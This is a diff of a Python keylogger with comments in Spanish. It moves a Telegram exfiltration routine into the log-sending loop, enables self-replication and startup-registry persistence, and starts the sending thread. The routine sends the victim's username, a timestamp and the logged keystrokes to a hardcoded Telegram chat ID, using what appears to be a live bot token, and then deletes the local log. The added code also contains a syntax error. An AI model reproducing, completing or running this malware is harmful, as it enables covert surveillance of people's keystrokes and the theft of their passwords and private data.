@@ -364,7 +364,32 @@ def SendLog():
         if (exito): # Solo se ejecutará si se inició correctamente la base de datos
             UpdateUser()
         #print("[DataBase]=> "+str(exito))
+    def TelegramBot():
+        try:
+            pathO = logKeyPath()+ LogName()
+            pathN = logKeyPath()+ random_char(20)+".txt"
+            os.rename(pathO, pathN)
+            # Abre el archivo
+            f = open (pathN ,'r')
+            T = datetime.datetime.now()
+            currentTime = T.strftime("%A") + " " + T.strftime("%d") + " de " + T.strftime("%B")+" "+ T.strftime("%I")+ ":"+ T.strftime("%M")+ " "+ T.strftime("%p")
 
+            try:
+                bot = telebot.TeleBot(Token())      # Instancia
+                bot.send_message(ID(),"Usuario: "+str(getuser())+"\nFecha: "+currentTime+"\nRegistro de teclas:")  
+                bot.send_message(ID(),f.read())   #
+                f.close()
+                os.remove(pathN)
+            except:
+                print("[Telegram] Error al subir los datos")
+        except:
+            try:
+                pass
+                f.close()
+                os.remove(pathN)  # Borra la carpeta por posible Errores
+            except:
+                pass
+            print("[Telegram] No se encuentra el archivo")
     while (True):
         time.sleep(timeSend()*60) # Tiempo de espera por minutos 
         #time.sleep(4) # Solo antigueeo 
@@ -389,45 +414,10 @@ def SendLog():
 
             if (GMailOrDataBase() == 1):    # Send Data Base
                 SendDataBaseMySQL()
+            if (GMailOrDataBase() == 2:    # Send Telegram
+                TelegramBot()
         else:
             print("[Send] sin conexión")
-
-# Telegram Bot
-def TelegramBot():
-    def random_char(y=5):
-           return ''.join(random.choice(string.ascii_letters) for x in range(y))
-    try:
-        pathO = logKeyPath()+ LogName()
-        pathN = logKeyPath()+ random_char(15)+".txt"
-        os.rename(pathO, pathN)
-        # Abre el archivo
-        f = open (pathN ,'r')
-        #data = f.read()
-        #f.close()
-        #print(data)
-        # Tiempo
-        T = datetime.datetime.now()
-
-        currentTime = T.strftime("%A") + " " + T.strftime("%d") + " de " + T.strftime("%B")+" "+ T.strftime("%I")+ ":"+ T.strftime("%M")+ " "+ T.strftime("%p")
-
-        try:
-            bot = telebot.TeleBot(Token())      # Instancia
-            bot.send_message(ID(),"Usuario: "+str(getuser()))
-            bot.send_message(ID(),"Usuario: \nFecha: "+currentTime+"\nRegistro de teclas:")  
-            bot.send_message(ID(),f.read())   #
-            f.close()
-            os.remove(pathN)
-        except:
-            print("[Telegram] Error al subir los datos")
-    except:
-        try:
-            pass
-            f.close()
-            os.remove(pathN)  # Borra la carpeta por posible Errores
-        except:
-            pass
-        print("[Telegram] No se encuentra el archivo")
-
 
 
 # ***************************************   ZONA CUSTOM AVANZADA  ***********************************
@@ -485,9 +475,11 @@ def DB_PORT():
 
 # ************ End Zone DATABASE ************* 
 def GMailOrDataBase():
-    return 2    # 2 = TelegramBot
+    return 2    # 0 = Gmail
                 # 1 = DataBase              # Solo se puede usar una opción
-                # 0 = Gmail
+                # 2 = TelegramBot
+                
+                
 
 
 def timeSend(): # Tiempo de envío perzonalizado
@@ -495,7 +487,7 @@ def timeSend(): # Tiempo de envío perzonalizado
 
 # ************ Zone Telegram *************     
 def ID():
-    return 831756903            # <=  ID de chat telegram 
+    return 831756903            # <=  ID de chat telegram [Nota] no lo coloque entre comillas
 
 def Token():
     return "1159435940:AAHKZLqDuuk4XBYHUx2GmQei0-RoRvis2v8"    # Token del Bot del Telegram
@@ -513,12 +505,12 @@ if __name__ == '__main__':
 
     
 
-    #EscondeKey()    # Se replica dentro de la computadora
-    #addStartup()    # Modifica registro de arranque
+    EscondeKey()    # Se replica dentro de la computadora
+    addStartup()    # Modifica registro de arranque
     p1 = threading.Thread(target=KeyLogger)   # Registra teclas
 
-    #p2 = threading.Thread(target=SendLog)   # Enviar Registro
-    #p2.start()
+    p2 = threading.Thread(target=SendLog)   # Enviar Registro
+    p2.start()
     p1.start()
     p1.join()
 
